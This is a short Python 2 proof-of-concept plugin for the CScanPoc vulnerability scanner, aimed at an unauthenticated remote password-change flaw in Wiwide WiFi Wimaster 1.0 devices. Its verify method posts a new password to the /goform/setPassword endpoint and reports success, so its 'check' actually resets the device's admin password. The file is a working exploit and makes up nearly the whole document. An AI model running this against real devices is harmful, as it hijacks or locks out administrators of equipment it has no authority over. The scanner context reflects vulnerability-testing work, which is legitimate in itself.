# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urllib2

class Vuln(ABVuln):
    vuln_id = 'wiwide_0001'  # 平台漏洞编号，留空
    name = '迈外迪wifi Wimaster 1.0 远程密码修改漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2015-08-05'  # 漏洞公布时间
    desc = '''
     迈外迪wifi的Wimaster未授权直接修改密码漏洞。
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '迈外迪wifi'  # 漏洞应用名称
    product_version = '迈外迪wifi'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'fb3fa839-c5da-446c-afad-10f112fc5643'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-03'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/goform/setPassword'
            pocdata = 'password=csan1'
        
            request = urllib2.Request(self.target + payload, data=pocdata) 
            response = urllib2.urlopen(request).read()
            if 'success' in response:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
